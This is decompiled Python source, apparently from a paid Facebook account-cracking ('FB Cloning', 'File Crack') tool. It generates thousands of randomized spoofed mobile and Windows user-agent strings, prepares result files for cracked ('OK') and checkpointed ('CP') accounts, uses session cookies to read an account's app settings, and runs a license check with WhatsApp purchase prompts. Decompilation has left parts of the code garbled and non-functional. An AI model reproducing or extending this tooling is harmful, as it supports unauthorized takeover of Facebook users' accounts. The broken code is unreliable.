    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    for agent in range(10000):
        aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
        b = random.choice([
            '6',
            '7',
            '8',
            '9',
            '10',
            '11',
            '12'])
        c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.randrange(1, 999)
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h = random.randrange(73, 100)
        i = '0'
        j = random.randrange(4200, 4900)
        k = random.randrange(40, 150)
        l = 'Mobile Safari/533.1'
        fullagnt = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
        ugen2.append(fullagnt)
        for i in range(10000):
            aa = 'Mozilla/5.0 (Linux; Android'
            b = random.choice([
                '6',
                '7',
                '8',
                '9',
                '10',
                '11',
                '12'])
            c = 'Redmi 6A Build/N2G47H)'
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.randrange(1, 999)
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            h = random.randrange(73, 100)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36'
            uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            ugen.append(uaku2)
            rr = random.randint
            rc = random.choice
            satu = f'''Mozilla/5.0 (Linux; Android {str(rr(211111, 299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73, 99))}.0.{str(rr(4500, 4900))}.{str(rr(75, 150))} Mobile Safari/537.36'''
            dua = f'''Mozilla/5.0 (Linux; Android {str(rr(7, 12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75, 150))}.0.{str(rr(5111, 5999))}.{str(rr(73, 99))} Mobile Safari/537.36'''
            tiga = f'''Mozilla/5.0 (Linux; Android {str(rr(111111, 199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73, 99))}.0.{str(rr(4500, 4900))}.{str(rr(75, 150))} Version/4.0 Chrome/ {str(rr(2111111, 2999999))} Mobile Safari/537.36'''
            empat = f'''Mozilla/5.0 (Linux; Android {str(rr(7, 12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75, 150))}.0.{str(rr(5111, 5999))}.{str(rr(73, 99))} Mobile Safari/537.36'''
            uaku2 = str(rc([
                satu,
                dua,
                tiga,
                empat]))
            ugen2.append(uaku2)
            for agenku in range(10000):
                a = 'Mozilla/5.0 (Linux; Android'
                b = random.choice([
                    '5.0',
                    '6.0',
                    '7.0',
                    '8.1.0',
                    '9',
                    '10',
                    '11',
                    '12'])
                c = random.choice([
                    'M2006C3MII'])
                d = random.choice([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                e = random.randrange(1, 999)
                f = random.choice([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
                h = random.randrange(80, 103)
                i = '0'
                j = random.randrange(4200, 4900)
                k = random.randrange(40, 150)
                l = 'Mobile Safari/537.36'
                uakuh = f'''{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                ugen2.append(uakuh)
                for x in range(10000):
                    a = 'Mozilla/5.0 (Linux; Android'
                    b = random.choice([
                        '8.1.0',
                        '9',
                        '10',
                        '11',
                        '12',
                        '13'])
                    c = 'Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
                    d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
                    e = random.randrange(73, 100)
                    f = '0'
                    g = random.randrange(4200, 4900)
                    h = random.randrange(40, 150)
                    i = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
                    uakuh = f'''{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'''
                    ugen2.append(uakuh)
                    for x in range(10000):
                        aa = 'Mozilla/5.0 (Linux; U; Android'
                        b = random.choice([
                            '5.0',
                            '6.0',
                            '7.0',
                            '8.1.0',
                            '9',
                            '10',
                            '11',
                            '12'])
                        c = random.choice([
                            '801SO'])
                        d = random.choice([
                            'A',
                            'B',
                            'C',
                            'D',
                            'E',
                            'F',
                            'G',
                            'H',
                            'I',
                            'J',
                            'K',
                            'L',
                            'M',
                            'N',
                            'O',
                            'P',
                            'Q',
                            'R',
                            'S',
                            'T',
                            'U',
                            'V',
                            'W',
                            'X',
                            'Y',
                            'Z'])
                        e = random.randrange(1, 999)
                        f = random.choice([
                            'A',
                            'B',
                            'C',
                            'D',
                            'E',
                            'F',
                            'G',
                            'H',
                            'I',
                            'J',
                            'K',
                            'L',
                            'M',
                            'N',
                            'O',
                            'P',
                            'Q',
                            'R',
                            'S',
                            'T',
                            'U',
                            'V',
                            'W',
                            'X',
                            'Y',
                            'Z'])
                        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
                        h = random.randrange(80, 103)
                        i = '0'
                        j = random.randrange(4200, 4900)
                        k = random.randrange(40, 150)
                        l = 'Mobile Safari/537.36 OPR/63.0.2254.62069'
                        uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                        ugen2.append(uakuh)
                        for x in range(10000):
                            a = 'Mozilla/5.0 (Linux; Android'
                            b = random.choice([
                                '8.1.0',
                                '9',
                                '10',
                                '11',
                                '12',
                                '13'])
                            c = 'SM-G960N Build/QP1A.190711.020; wv)'
                            d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
                            e = random.randrange(73, 100)
                            f = '0'
                            g = random.randrange(4200, 4900)
                            h = random.randrange(40, 150)
                            i = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
                            uakuh = f'''{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'''
                            ugen2.append(uakuh)
                            for x in range(10000):
                                aa = 'Mozilla/5.0 (Linux; Android'
                                b = random.choice([
                                    '5.0',
                                    '6.0',
                                    '7.0',
                                    '8.1.0',
                                    '9',
                                    '10',
                                    '11',
                                    '12'])
                                c = random.choice([
                                    'SM-J610F'])
                                d = random.choice([
                                    'A',
                                    'B',
                                    'C',
                                    'D',
                                    'E',
                                    'F',
                                    'G',
                                    'H',
                                    'I',
                                    'J',
                                    'K',
                                    'L',
                                    'M',
                                    'N',
                                    'O',
                                    'P',
                                    'Q',
                                    'R',
                                    'S',
                                    'T',
                                    'U',
                                    'V',
                                    'W',
                                    'X',
                                    'Y',
                                    'Z'])
                                e = random.randrange(80, 106)
                                f = random.choice([
                                    'A',
                                    'B',
                                    'C',
                                    'D',
                                    'E',
                                    'F',
                                    'G',
                                    'H',
                                    'I',
                                    'J',
                                    'K',
                                    'L',
                                    'M',
                                    'N',
                                    'O',
                                    'P',
                                    'Q',
                                    'R',
                                    'S',
                                    'T',
                                    'U',
                                    'V',
                                    'W',
                                    'X',
                                    'Y',
                                    'Z'])
                                g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
                                h = random.randrange(80, 103)
                                i = '0'
                                j = random.randrange(4200, 4900)
                                k = random.randrange(40, 150)
                                l = 'Mobile Safari/537.36'
                                uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                                ugen2.append(uakuh)
                                for x in range(10000):
                                    aa = 'Mozilla/5.0 (Linux; U; Android'
                                    b = random.choice([
                                        '5.0',
                                        '6.0',
                                        '7.0',
                                        '8.1.0',
                                        '9',
                                        '10',
                                        '11',
                                        '12'])
                                    c = random.choice([
                                        'LE2113'])
                                    d = random.choice([
                                        'A',
                                        'B',
                                        'C',
                                        'D',
                                        'E',
                                        'F',
                                        'G',
                                        'H',
                                        'I',
                                        'J',
                                        'K',
                                        'L',
                                        'M',
                                        'N',
                                        'O',
                                        'P',
                                        'Q',
                                        'R',
                                        'S',
                                        'T',
                                        'U',
                                        'V',
                                        'W',
                                        'X',
                                        'Y',
                                        'Z'])
                                    e = random.randrange(1, 999)
                                    f = random.choice([
                                        'A',
                                        'B',
                                        'C',
                                        'D',
                                        'E',
                                        'F',
                                        'G',
                                        'H',
                                        'I',
                                        'J',
                                        'K',
                                        'L',
                                        'M',
                                        'N',
                                        'O',
                                        'P',
                                        'Q',
                                        'R',
                                        'S',
                                        'T',
                                        'U',
                                        'V',
                                        'W',
                                        'X',
                                        'Y',
                                        'Z'])
                                    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
                                    h = random.randrange(80, 103)
                                    i = '0'
                                    j = random.randrange(4200, 4900)
                                    k = random.randrange(40, 150)
                                    l = 'Mobile Safari/537.36'
                                    uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                                    ugen2.append(uakuh)
                                    for x in range(10000):
                                        aa = 'Mozilla/5.0 (Linux; U; Android'
                                        b = random.choice([
                                            '6',
                                            '7',
                                            '8',
                                            '9',
                                            '10',
                                            '11',
                                            '12'])
                                        c = [
                                            'en-us; RMX1925 Build/QKQ1.200209.002)']
                                        d = random.choice([
                                            'A',
                                            'B',
                                            'C',
                                            'D',
                                            'E',
                                            'F',
                                            'G',
                                            'H',
                                            'I',
                                            'J',
                                            'K',
                                            'L',
                                            'M',
                                            'N',
                                            'O',
                                            'P',
                                            'Q',
                                            'R',
                                            'S',
                                            'T',
                                            'U',
                                            'V',
                                            'W',
                                            'X',
                                            'Y',
                                            'Z'])
                                        e = random.randrange(1, 999)
                                        f = random.choice([
                                            'A',
                                            'B',
                                            'C',
                                            'D',
                                            'E',
                                            'F',
                                            'G',
                                            'H',
                                            'I',
                                            'J',
                                            'K',
                                            'L',
                                            'M',
                                            'N',
                                            'O',
                                            'P',
                                            'Q',
                                            'R',
                                            'S',
                                            'T',
                                            'U',
                                            'V',
                                            'W',
                                            'X',
                                            'Y',
                                            'Z'])
                                        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
                                        h = random.randrange(73, 100)
                                        i = '0'
                                        j = random.randrange(4200, 4900)
                                        k = random.randrange(40, 150)
                                        l = 'Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
                                        uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                                        ugen2.append(uakuh)
                                        for x in range(10000):
                                            aa = 'Mozilla/5.0 (Linux; U; Android'
                                            b = random.choice([
                                                '5.0',
                                                '6.0',
                                                '7.0',
                                                '8.1.0',
                                                '9',
                                                '10',
                                                '11',
                                                '12'])
                                            c = random.choice([
                                                'M2012K11C'])
                                            d = random.choice([
                                                'A',
                                                'B',
                                                'C',
                                                'D',
                                                'E',
                                                'F',
                                                'G',
                                                'H',
                                                'I',
                                                'J',
                                                'K',
                                                'L',
                                                'M',
                                                'N',
                                                'O',
                                                'P',
                                                'Q',
                                                'R',
                                                'S',
                                                'T',
                                                'U',
                                                'V',
                                                'W',
                                                'X',
                                                'Y',
                                                'Z'])
                                            e = random.randrange(1, 999)
                                            f = random.choice([
                                                'A',
                                                'B',
                                                'C',
                                                'D',
                                                'E',
                                                'F',
                                                'G',
                                                'H',
                                                'I',
                                                'J',
                                                'K',
                                                'L',
                                                'M',
                                                'N',
                                                'O',
                                                'P',
                                                'Q',
                                                'R',
                                                'S',
                                                'T',
                                                'U',
                                                'V',
                                                'W',
                                                'X',
                                                'Y',
                                                'Z'])
                                            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
                                            h = random.randrange(80, 103)
                                            i = '0'
                                            j = random.randrange(4200, 4900)
                                            k = random.randrange(40, 150)
                                            l = 'Mobile Safari/537.36 OPR/51.4.5237.26623'
                                            uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                                            ugen2.append(uakuh)
                                            for x in range(10000):
                                                aa = 'Mozilla/5.0 (Linux; U; Android'
                                                b = random.choice([
                                                    '5.0',
                                                    '6.0',
                                                    '7.0',
                                                    '8.1.0',
                                                    '9',
                                                    '10',
                                                    '11',
                                                    '12'])
                                                c = random.choice([
                                                    'vivo 1002T'])
                                                d = random.choice([
                                                    'A',
                                                    'B',
                                                    'C',
                                                    'D',
                                                    'E',
                                                    'F',
                                                    'G',
                                                    'H',
                                                    'I',
                                                    'J',
                                                    'K',
                                                    'L',
                                                    'M',
                                                    'N',
                                                    'O',
                                                    'P',
                                                    'Q',
                                                    'R',
                                                    'S',
                                                    'T',
                                                    'U',
                                                    'V',
                                                    'W',
                                                    'X',
                                                    'Y',
                                                    'Z'])
                                                e = random.randrange(1, 999)
                                                f = random.choice([
                                                    'A',
                                                    'B',
                                                    'C',
                                                    'D',
                                                    'E',
                                                    'F',
                                                    'G',
                                                    'H',
                                                    'I',
                                                    'J',
                                                    'K',
                                                    'L',
                                                    'M',
                                                    'N',
                                                    'O',
                                                    'P',
                                                    'Q',
                                                    'R',
                                                    'S',
                                                    'T',
                                                    'U',
                                                    'V',
                                                    'W',
                                                    'X',
                                                    'Y',
                                                    'Z'])
                                                g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
                                                h = random.randrange(80, 103)
                                                i = '0'
                                                j = random.randrange(4200, 4900)
                                                k = random.randrange(40, 150)
                                                l = 'Mobile Safari/537.36'
                                                uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                                                ugen2.append(uakuh)
                                                for x in range(10000):
                                                    aa = 'Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
                                                    b = random.choice([
                                                        '6',
                                                        '7',
                                                        '8',
                                                        '9',
                                                        '10',
                                                        '11',
                                                        '12'])
                                                    c = ' en-us; GT-'
                                                    d = random.choice([
                                                        'A',
                                                        'B',
                                                        'C',
                                                        'D',
                                                        'E',
                                                        'F',
                                                        'G',
                                                        'H',
                                                        'I',
                                                        'J',
                                                        'K',
                                                        'L',
                                                        'M',
                                                        'N',
                                                        'O',
                                                        'P',
                                                        'Q',
                                                        'R',
                                                        'S',
                                                        'T',
                                                        'U',
                                                        'V',
                                                        'W',
                                                        'X',
                                                        'Y',
                                                        'Z'])
                                                    e = random.randrange(1, 999)
                                                    f = random.choice([
                                                        'A',
                                                        'B',
                                                        'C',
                                                        'D',
                                                        'E',
                                                        'F',
                                                        'G',
                                                        'H',
                                                        'I',
                                                        'J',
                                                        'K',
                                                        'L',
                                                        'M',
                                                        'N',
                                                        'O',
                                                        'P',
                                                        'Q',
                                                        'R',
                                                        'S',
                                                        'T',
                                                        'U',
                                                        'V',
                                                        'W',
                                                        'X',
                                                        'Y',
                                                        'Z'])
                                                    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
                                                    h = random.randrange(73, 100)
                                                    i = '0'
                                                    j = random.randrange(4200, 4900)
                                                    k = random.randrange(40, 150)
                                                    l = 'Mobile Safari/537.36'
                                                    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                                                    ugen2.append(uaku2)
                                                    for x in range(10000):
                                                        a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
                                                        b = random.randrange(100, 9999)
                                                        c = random.randrange(100, 9999)
                                                        d = random.choice([
                                                            'A',
                                                            'B',
                                                            'C',
                                                            'D',
                                                            'E',
                                                            'F',
                                                            'G',
                                                            'H',
                                                            'I',
                                                            'J',
                                                            'K',
                                                            'L',
                                                            'M',
                                                            'N',
                                                            'O',
                                                            'P',
                                                            'Q',
                                                            'R',
                                                            'S',
                                                            'T',
                                                            'U',
                                                            'V',
                                                            'W',
                                                            'X',
                                                            'Y',
                                                            'Z'])
                                                        e = random.choice([
                                                            'A',
                                                            'B',
                                                            'C',
                                                            'D',
                                                            'E',
                                                            'F',
                                                            'G',
                                                            'H',
                                                            'I',
                                                            'J',
                                                            'K',
                                                            'L',
                                                            'M',
                                                            'N',
                                                            'O',
                                                            'P',
                                                            'Q',
                                                            'R',
                                                            'S',
                                                            'T',
                                                            'U',
                                                            'V',
                                                            'W',
                                                            'X',
                                                            'Y',
                                                            'Z'])
                                                        f = random.choice([
                                                            'A',
                                                            'B',
                                                            'C',
                                                            'D',
                                                            'E',
                                                            'F',
                                                            'G',
                                                            'H',
                                                            'I',
                                                            'J',
                                                            'K',
                                                            'L',
                                                            'M',
                                                            'N',
                                                            'O',
                                                            'P',
                                                            'Q',
                                                            'R',
                                                            'S',
                                                            'T',
                                                            'U',
                                                            'V',
                                                            'W',
                                                            'X',
                                                            'Y',
                                                            'Z'])
                                                        g = random.choice([
                                                            'A',
                                                            'B',
                                                            'C',
                                                            'D',
                                                            'E',
                                                            'F',
                                                            'G',
                                                            'H',
                                                            'I',
                                                            'J',
                                                            'K',
                                                            'L',
                                                            'M',
                                                            'N',
                                                            'O',
                                                            'P',
                                                            'Q',
                                                            'R',
                                                            'S',
                                                            'T',
                                                            'U',
                                                            'V',
                                                            'W',
                                                            'X',
                                                            'Y',
                                                            'Z'])
                                                        h = random.randrange(1, 9)
                                                        i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
                                                        j = random.randrange(1, 9)
                                                        k = random.randrange(1, 9)
                                                        l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
                                                        ugen2 = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
                                                        
                                                        def uaku():
                                                            ua = open('bbnew.txt', 'r').read().splitlines()
                                                            for ub in ua:
                                                                ugen.append(ub)
                                                                return None
                                                                a = requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
                                                                ua = open('bbnew.txt', 'w')
                                                                aa = re.findall('line">(.*?)<', str(a))
                                                                for un in aa:
                                                                    ua.write(un + '\n')
                                                                    ua = open('bbnew.txt', 'r').read().splitlines()
                                                                    return None

                                                        (id, id2, loop, oki, cpi, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
                                                        cokbrut = []
                                                        pwpluss = []
                                                        pwnya = []
                                                        P = '\x1b[1;97m'
                                                        M = '\x1b[1;91m'
                                                        H = '\x1b[1;92m'
                                                        K = '\x1b[1;93m'
                                                        B = '\x1b[1;94m'
                                                        U = '\x1b[1;95m'
                                                        O = '\x1b[1;96m'
                                                        N = '\x1b[0m'
                                                        Z = '\x1b[1;30m'
                                                        sir = '\x1b[41m\x1b[1;97m'
                                                        x = '\x1b[m'
                                                        m = '\x1b[1;91m'
                                                        k = '\x1b[93m'
                                                        h = '\x1b[1;92m'
                                                        hh = '\x1b[32m'
                                                        u = '\x1b[95m'
                                                        kk = '\x1b[33m'
                                                        b = '\x1b[1;96m'
                                                        p = '\x1b[0;34m'
                                                        asu = random.choice([
                                                            m,
                                                            k,
                                                            h,
                                                            u,
                                                            b])
                                                        Z = '\x1b[0;90m'
                                                        M = '\x1b[38;5;196m'
                                                        H = '\x1b[38;5;46m'
                                                        K = '\x1b[38;5;226m'
                                                        B = '\x1b[38;5;44m'
                                                        U = '\x1b[0;95m'
                                                        O = '\x1b[0;96m'
                                                        P = '\x1b[38;5;231m'
                                                        J = '\x1b[38;5;208m'
                                                        A = '\x1b[38;5;248m'
                                                        A = '\x1b[1;97m'
                                                        R = '\x1b[38;5;196m'
                                                        Y = '\x1b[1;33m'
                                                        G = '\x1b[38;5;46m'
                                                        B = '\x1b[38;5;8m'
                                                        G1 = '\x1b[38;5;46m'
                                                        G2 = '\x1b[38;5;47m'
                                                        G3 = '\x1b[38;5;48m'
                                                        G4 = '\x1b[38;5;49m'
                                                        G5 = '\x1b[38;5;50m'
                                                        X = '\x1b[1;34m'
                                                        X1 = '\x1b[38;5;14m'
                                                        X2 = '\x1b[38;5;123m'
                                                        X3 = '\x1b[38;5;122m'
                                                        X4 = '\x1b[38;5;86m'
                                                        X5 = '\x1b[38;5;121m'
                                                        S = '\x1b[1;96m'
                                                        M = '\x1b[38;5;205m'
                                                        dic = {
                                                            '1': 'January',
                                                            '2': 'February',
                                                            '3': 'March',
                                                            '4': 'April',
                                                            '5': 'May',
                                                            '6': 'June',
                                                            '7': 'July',
                                                            '8': 'August',
                                                            '9': 'September',
                                                            '10': 'October',
                                                            '11': 'November',
                                                            '12': 'December' }
                                                        dic2 = {
                                                            '01': 'January',
                                                            '02': 'February',
                                                            '03': 'March',
                                                            '04': 'April',
                                                            '05': 'May',
                                                            '06': 'June',
                                                            '07': 'July',
                                                            '08': 'August',
                                                            '09': 'September',
                                                            '10': 'October',
                                                            '11': 'November',
                                                            '12': 'Devember' }
                                                        tgl = datetime.datetime.now().day
                                                        bln = dic[str(datetime.datetime.now().month)]
                                                        thn = datetime.datetime.now().year
                                                        okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
                                                        cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
                                                        date = str(tgl) + '/' + str(bln) + '/' + str(thn)
                                                        ltx = int(lt()[3])
                                                        if ltx > 12:
                                                            a = ltx - 12
                                                            tag = 'PM'
a = ltx
tag = 'AM'

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f'''Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'''
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'''5{bx}.{bV}'''
    B = f'''Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice([
        '2',
        '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'''
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'''5{cx}.{cV}'''
    C = f'''Mozilla/5.0 (Windows NT 6.{str(random.choice([
        '2',
        '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'''
    D = f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'''
    return random.choice([
        A,
        B,
        C,
        D])


def cek_apk(session, coki):
    w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies = {
        'cookie': coki }).text
    sop = BeautifulSoup(w, 'html.parser')
    x = sop.find('form', method = 'post')
    game = x.find_all('h3')()
    if len(game) == 0:
        print(f'''%s{P}[%s×%s] %sSorry there is no Active  Apk%s         ''' % (N, M, N, B, N))
    print(f'''[🔥] %s ☆ Your Active Apps ☆     :{B}''' % GREEN)
    for i in range(len(game)):
        print(f'''[%s%s] {H}%s %s''' % (N, i + 1, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'), N))
        w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies = {
            'cookie': coki }).text
        sop = BeautifulSoup(w, 'html.parser')
        x = sop.find('form', method = 'post')
        game = x.find_all('h3')()
        if len(game) == 0:
            print('%s[%s!%s] %sSorry there is no Expired Apk%s                \n' % (N, B, N, M, N))
            return None
        (lambda .0: for i in .0:
[ i.text ])(f'''[✔] %s ☑ Your Expired Apps ☑    :{WHITE}''' % M)
        for i in range(len(game)):
            print('[%s%s] %s %s' % (N, i + 1, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'), N))
            print(f'''{M!s}═════════════════════{H!s}═════════════════════{P!s}''')
            return None


def main_apv():
    os.system('clear')
    print(logo)
    uuid = str(os.geteuid())
    Xyteee = f'''Alone1x6b7b5c{uuid!s}85b8n9nfdi{uuid!s}'''
    print(logo)
    os.system('clear')
    print(logo)
    print(' Your Key : \x1b[1;31m' + Xyteee)
    print('\x1b[1;92m--------------------------------------------------')
    system = requests.get('https://github.com/Mr-Alon/File-Cloning-Free/blob/main/Approve.txt').text
    if Xyteee in system:
        print()
        msg = str(os.geteuid())
        time.sleep(1)
        menu()
        return None
    None('\x1b[1;92m Now it will work well in all countries')
    print('\x1b[1;92m-----------------------------------------------------\x1b[1;97m')
    print('\x1b[1;92m[\x1b[1;92m•\x1b[1;92m]\x1b[1;92m Notes : Nix Tools Can buy in all countries!')
    print('\x1b[1;92m-----------------------------------------------------\x1b[1;97m')
    print('\x1b[1;92m [\x1b[1;92m1\x1b[1;92m]\x1b[1;92m 8$ \x1b[1;92mApproval For 1 month')
    print(' \x1b[1;92m[\x1b[1;92m2\x1b[1;92m]\x1b[1;92m 6$ \x1b[1;92mApproval For 15 days')
    print(' \x1b[1;92m[\x1b[1;92m3\x1b[1;92m]\x1b[1;92m 3$ \x1b[1;92mApproval For 7 days \x1b[1;37m')
    print('\x1b[1;92m-----------------------------------------------------')
    Picchi = input(' Select Buy Option : ')
    os.system('clear')
    print(logo)
    print(f''' \x1b[1;92mYour Key :\x1b[31;1m{Xyteee}''')
    print('\x1b[1;92m Tools    : FB Cloning')
    print(" \x1b[1;92m\n \x1b[1;92m\x1b[1;92mNote: If You Are Free User Don't Come IB\x1b[0;0m")
    print('\n\x1b[1;92m [•] File Crack \x1b[1;92m\n [•] Random Crack \n [•] Exit Program')
    print('-----------------------------------------------------')
    url_wa = 'https://api.whatsapp.com/send?phone=+8801332718196&text='
    choice = input(' Enter your choice  : ')
    tks = 'Hi Nix Sir, I Need To Buy Your Nix Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : ' + choice + '\n Key : ' + Xyteee + '\n Buy Select : ' + Picchi
    subprocess.check_output([
        'am',
        'start',
        url_wa + tks])
    time.sleep(2)
    print('-----------------------------------------------------\n Run again with permission from admin')
    main_apv()
    return None
    sys.exit()


def alvino_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)
        return None


def clear():
    os.system('clear')


def back():
    login()


def contact():
    back()


def linex():
    print('\x1b[1;37m')


def animation(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        return None

